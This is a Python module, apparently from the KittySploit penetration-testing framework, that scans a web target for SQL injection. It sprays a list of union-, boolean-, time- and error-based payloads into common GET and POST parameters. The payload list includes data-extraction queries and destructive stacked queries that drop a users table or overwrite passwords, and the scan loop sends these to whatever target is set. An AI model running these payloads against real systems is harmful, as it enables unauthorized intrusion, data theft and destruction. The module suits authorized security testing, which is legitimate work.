#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse
import time
import re


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'SQL Injection Scanner',
        'description': 'Scans for SQL injection vulnerabilities including union-based, boolean-based, time-based, and error-based SQL injection',
        'author': 'KittySploit Team',
        'tags': ['web', 'sqli', 'sql', 'injection', 'scanner', 'security'],
        'references': [
            'https://owasp.org/www-community/attacks/SQL_Injection',
            'https://portswigger.net/web-security/sql-injection',
            'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
        ]
    }

    # SQL injection payloads
    SQLI_PAYLOADS = [
        # Basic SQL injection
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "') OR ('1'='1'/*",
        "' OR 'a'='a",
        "') OR ('a'='a",
        
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT user(),database(),version()--",
        "' UNION SELECT @@version,@@datadir,@@hostname--",
        
        # Boolean-based blind
        "' OR 1=1 AND 'a'='a",
        "' OR 1=1 AND 'a'='b",
        "' OR 1=2 AND 'a'='a",
        "' AND 1=1--",
        "' AND 1=2--",
        
        # Time-based blind
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        "'; SELECT BENCHMARK(5000000,MD5(1))--",
        
        # Error-based
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        
        # Stacked queries
        "'; DROP TABLE users--",
        "'; UPDATE users SET password='hacked'--",
        
        # Second-order SQL injection
        "admin'--",
        "admin'/*",
        "admin'#",
    ]

    # Parameter names commonly used
    COMMON_PARAMS = [
        'id', 'user', 'user_id', 'username', 'email', 'password',
        'q', 'query', 'search', 'filter', 'sort', 'order',
        'page', 'limit', 'offset', 'count',
        'category', 'category_id', 'tag', 'tag_id',
        'name', 'value', 'data', 'input', 'param',
    ]

    def check(self):
        """
        Check if the target is accessible
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response and response.status_code in [200, 301, 302, 403, 404, 401]:
                return True
            return False
        except Exception as e:
            return False

    def test_sqli_payload(self, payload, param_name='id', method='GET'):
        """
        Test a SQL injection payload
        
        Args:
            payload: The SQL injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                # URL encode the payload
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                
                start_time = time.time()
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time
            else:
                # POST request
                post_data = {param_name: payload}
                start_time = time.time()
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time

            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}

            # Analyze response for SQL injection indicators
            is_vulnerable = False
            indicators = []
            injection_type = None

            # Check for SQL error messages
            sql_errors = [
                'sql syntax', 'mysql', 'postgresql', 'sqlite', 'oracle',
                'sql server', 'microsoft ole db', 'odbc', 'driver',
                'sqlstate', 'sql error', 'database error',
                'warning: mysql', 'warning: pg_', 'unclosed quotation',
                'quoted string not properly terminated',
                'syntax error', 'mysql_fetch', 'mysqli_',
                'pg_query', 'pg_exec', 'ora-', 'oracle error',
            ]

            response_lower = response.text.lower()
            for error in sql_errors:
                if error in response_lower:
                    is_vulnerable = True
                    injection_type = 'Error-based'
                    indicators.append(f'SQL error: {error}')
                    break

            # Check for time-based SQL injection (delayed response)
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower() or 'pg_sleep' in payload.lower() or 'benchmark' in payload.lower():
                if elapsed_time > 4:  # More than 4 seconds
                    is_vulnerable = True
                    injection_type = 'Time-based'
                    indicators.append(f'Time-based delay: {elapsed_time:.2f}s')

            # Check for boolean-based differences
            if 'or 1=1' in payload.lower() or "or '1'='1'" in payload.lower():
                # Check if response is different (longer/shorter)
                if len(response.text) > 1000:  # Arbitrary threshold
                    indicators.append('Response length difference (possible boolean-based)')
                    if not injection_type:
                        injection_type = 'Boolean-based'

            # Check for union-based injection
            if 'union' in payload.lower() and 'select' in payload.lower():
                # Check if response contains data that might be from UNION
                if response.status_code == 200 and len(response.text) > 100:
                    # Look for database-related content
                    db_indicators = ['mysql', 'postgres', 'sqlite', 'oracle', 'mssql']
                    if any(indicator in response_lower for indicator in db_indicators):
                        is_vulnerable = True
                        injection_type = 'Union-based'
                        indicators.append('Possible UNION injection with database info')

            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'injection_type': injection_type,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_time': elapsed_time,
                'response_length': len(response.text)
            }

        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the SQL injection scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting SQL injection scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Test GET parameters
        print_status("Testing GET parameters for SQL injection...")
        print_info("")
        
        for param in self.COMMON_PARAMS:
            print_info(f"Testing parameter: {param}")
            
            for i, payload in enumerate(self.SQLI_PAYLOADS[:20], 1):  # Test first 20 payloads per param
                result = self.test_sqli_payload(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential SQL injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Type: {result.get('injection_type', 'Unknown')}")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info(f"      Status Code: {result.get('status_code')}")
                    if result.get('response_time'):
                        print_info(f"      Response Time: {result.get('response_time'):.2f}s")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test POST parameters
        print_status("Testing POST parameters for SQL injection...")
        print_info("")
        
        for param in self.COMMON_PARAMS[:10]:  # Test first 10 params via POST
            print_info(f"Testing POST parameter: {param}")
            
            for payload in self.SQLI_PAYLOADS[:15]:  # Test first 15 payloads
                result = self.test_sqli_payload(payload, param, method='POST')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential SQL injection found (POST)!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Type: {result.get('injection_type', 'Unknown')}")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("SQL Injection Scan Summary")
        print_status("=" * 60)
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_warning("SQL Injection vulnerabilities detected:")
            print_info("")
            
            # Group by injection type
            by_type = {}
            for vuln in self.vulnerabilities:
                inj_type = vuln.get('injection_type', 'Unknown')
                if inj_type not in by_type:
                    by_type[inj_type] = []
                by_type[inj_type].append(vuln)
            
            for inj_type, vulns in by_type.items():
                print_info(f"{inj_type} SQL Injection ({len(vulns)} found):")
                table_data = []
                for vuln in vulns[:10]:  # Show first 10 per type
                    payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                    indicators = ', '.join(vuln.get('indicators', [])[:1])
                    table_data.append([
                        vuln.get('param', 'N/A'),
                        vuln.get('method', 'GET'),
                        payload_short,
                        indicators
                    ])
                
                if table_data:
                    print_table(['Parameter', 'Method', 'Payload', 'Indicators'], table_data)
                print_info("")
            
            print_warning("IMPORTANT: These are potential vulnerabilities. Manual verification with tools like SQLMap is required.")
        else:
            print_info("No SQL injection vulnerabilities detected during automated testing.")
            print_info("Note: This does not guarantee the application is secure.")
        
        return True
